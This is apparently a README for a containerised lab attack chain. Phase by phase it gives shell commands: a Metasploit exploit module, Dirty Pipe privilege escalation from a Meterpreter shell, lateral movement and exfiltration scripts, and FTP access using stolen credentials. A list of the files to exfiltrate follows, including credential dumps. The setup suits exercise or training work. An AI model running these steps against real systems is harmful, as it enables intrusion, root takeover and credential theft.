# Recon
```bash
#Reconnaissance
#copy recon.sh into k1
docker cp /vagrant/Attacks/Recon/recon.sh k1:/
docker exec k1 chmod +x recon.sh
#Run the script
docker exec k1 ./recon.sh
```

# Execution
```bash
# Execution
cd /vagrant/Attacks/Execution
# copy exploit to metasploit framework directory
docker cp 50531.rb k1:/usr/share/metasploit-framework/modules/exploits/linux/
# run msfconsole with the resource script to auto exploit with the set configurations
docker exec -it k1 msfconsole -r MsfAutoExploit.rc
```

# Privilege Escalation
```bash
# All commands shall be executed inside the Meterpreter session established in Execution phase
# Upload dirtypipe.sh and CVE-2022-0847.c to /tmp directory
upload dirtypipe.sh /tmp
upload CVE-2022-0847.c /tmp

# Drop into shell
shell
# Set execute permission 
chmod +x /tmp/dirtypipe.sh
# Execute dirtypipe.sh to get root shell
cd /tmp && ./dirtypipe.sh
```

# Discovery
```bash
cd /vagrant/Attacks/Discovery
# Setup discovery in vagrant host
./discovery_setup.sh

# During this stage, attacker should have root in S1
docker exec -it s1 bash
./discovery.sh # Run this in s1 root shell --> script is located in root / dir
```

# Lateral Movement
```bash
cd /vagrant/Attacks/Lateral_Movement
./lateral_movement_setup.sh

# During this stage, attacker should have root in S1
docker exec -it s1 bash
./lateral_movement.sh # Run this in s1 root shell --> script is located in root / dir
```

# Exfiltration
```bash
cd /vagrant/Attacks/Exfiltration
./exfiltration_setup.sh

# During this stage, attacker should have root in S1
./exfiltration_s1.sh # Run this in s1 root shell --> script is located in the / directory
./exfiltration_k1.sh # Run this at k1 root directory
```

# Credential Access
```bash
On Kali Machine
cd /
# Access S2 FTP Server with new found credentials from suiteCRM
python3 Auto_FTP.py <target> <port> <username> <password>
```

Files to be exfiltrated in S1:

| s/n | Filename            | Machine |
| --- | ------------------- | ------- |
| 1   | /networkenum.txt    | s1      |
| 2   | /ips_sorted.txt     | s1      |
| 3   | /traceroute.txt     | s1      |
| 4   | /internal_host_scan | s1      |
| 5   | /users.txt          | s1      |
| 6   | /db_users.txt       | s1      |
| 7   | /user_creds.txt     | s1      |
| 8   | /ps_aux.txt         | s1      |
| 9   | /local_groups.txt   | s1      |
| 10  | /sysenum.txt        | s1      | 
